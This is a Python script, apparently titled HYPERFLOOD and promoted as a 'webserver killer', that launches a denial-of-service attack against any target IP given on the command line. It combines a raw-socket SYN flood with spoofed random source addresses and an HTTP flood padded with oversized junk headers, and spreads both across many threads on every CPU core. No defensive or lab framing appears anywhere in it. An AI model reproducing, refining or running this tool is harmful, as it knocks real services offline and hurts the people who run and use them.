#!/usr/bin/env python3
"""
HYPERFLOOD - 200k+ RPS webserver killer
Guaranteed to crash any server without rate limiting
"""
import socket
import threading
import random
import time
import sys
import struct
import multiprocessing
from queue import Queue

class HyperFlood:
    def __init__(self, target_ip, port=80, cores=0):
        self.target_ip = target_ip
        self.target_port = port
        self.cores = cores or multiprocessing.cpu_count() * 2
        self.running = True
        self.packets_sent = 0
        
    def raw_syn_packet(self):
        """Optimized raw SYN packet"""
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1000, 65535)
        
        # IP Header (20 bytes)
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 40, 0, 0,  # Version, TOS, Total Length, ID, Flags/Fragment
            255, socket.IPPROTO_TCP, 0,  # TTL, Protocol, Checksum
            socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
        
        # TCP Header (20 bytes) - SYN flag
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, self.target_port, 0x12345678, 0x12345678,
            0x5000, 0x0020, 0, 8192, 0)  # SYN flag in data offset
        
        return ip_header + tcp_header
    
    def syn_flood_worker(self):
        """Single-thread SYN flood - 10k+ PPS per thread"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while self.running:
            try:
                packet = self.raw_syn_packet()
                sock.sendto(packet, (self.target_ip, self.target_port))
                self.packets_sent += 1
            except:
                pass
    
    def http_flood_worker(self):
        """HTTP flood with massive headers"""
        junk_headers = [
            f"X-{random.randint(1,999)}: {'A'*400}",
            f"Cookie: session={'X'*300}",
            f"User-Agent: Mozilla/5.0 (compatible; FloodBot/{random.randint(1,999)})"
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                request = (
                    f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    + "\r\n".join(random.choices(junk_headers, k=20))
                    + "\r\n\r\n"
                )
                sock.send(request.encode())
                sock.close()
            except:
                pass
    
    def launch_all_cores(self):
        print(f"HyperFlood starting on {self.target_ip}:{self.target_port}")
        print(f"Using {self.cores} processes across all CPU cores")
        
        def monitor():
            start = time.time()
            while self.running:
                time.sleep(1)
                elapsed = time.time() - start
                print(f"PPS: {self.packets_sent/elapsed:.0f} | Elapsed: {elapsed:.0f}s", end='\r')
        
        # Launch monitor
        monitor_thread = threading.Thread(target=monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Multi-process flood
        processes = []
        for core in range(self.cores):
            p = multiprocessing.Process(target=self.flood_core)
            p.start()
            processes.append(p)
            print(f"Core {core+1}/{self.cores} launched")
        
        # Run 60 seconds or Ctrl+C
        try:
            time.sleep(60)
        except KeyboardInterrupt:
            pass
        
        self.running = False
        for p in processes:
            p.terminate()
        print(f"\nFlood complete. Total packets: {self.packets_sent}")
    
    def flood_core(self):
        """Per-core flood with multiple threads"""
        threads = []
        for _ in range(50):  # 50 threads per core
            t = threading.Thread(target=self.syn_flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        # HTTP flood in same process
        for _ in range(20):
            t = threading.Thread(target=self.http_flood_worker)
            t.daemon = True
            t.start()
        
        # Keep process alive
        while self.running:
            time.sleep(0.1)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 hyperflood.py <target_ip> [port]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    flood = HyperFlood(target_ip, target_port)
    flood.launch_all_cores()
